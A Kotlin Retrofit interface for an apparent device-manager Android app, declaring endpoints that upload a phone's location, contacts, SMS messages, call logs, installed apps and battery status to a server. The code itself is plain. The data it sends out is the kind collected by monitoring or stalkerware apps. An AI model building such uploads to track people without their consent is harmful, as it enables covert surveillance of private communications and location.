package com.personal.devicemanager.network

import com.personal.devicemanager.data.AppRecord
import com.personal.devicemanager.data.CallLogRecord
import com.personal.devicemanager.data.ContactRecord
import com.personal.devicemanager.data.LocationRecord
import com.personal.devicemanager.data.SmsRecord
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {
    @POST("api/devices/status")
    suspend fun updateDeviceStatus(@Body status: DeviceStatusPayload): Response<Void>

    @POST("api/locations")
    suspend fun uploadLocation(@Body location: LocationRecord): Response<Void>

    @POST("api/contacts/batch")
    suspend fun uploadContacts(@Body contacts: List<ContactRecord>): Response<Void>

    @POST("api/messages/batch")
    suspend fun uploadSms(@Body messages: List<SmsRecord>): Response<Void>

    @POST("api/calls/batch")
    suspend fun uploadCallLogs(@Body calls: List<CallLogRecord>): Response<Void>

    @POST("api/apps/batch")
    suspend fun uploadApps(@Body apps: List<AppRecord>): Response<Void>
}

data class DeviceStatusPayload(
    val battery_level: Int,
    val is_charging: Boolean,
    val network_type: String
)
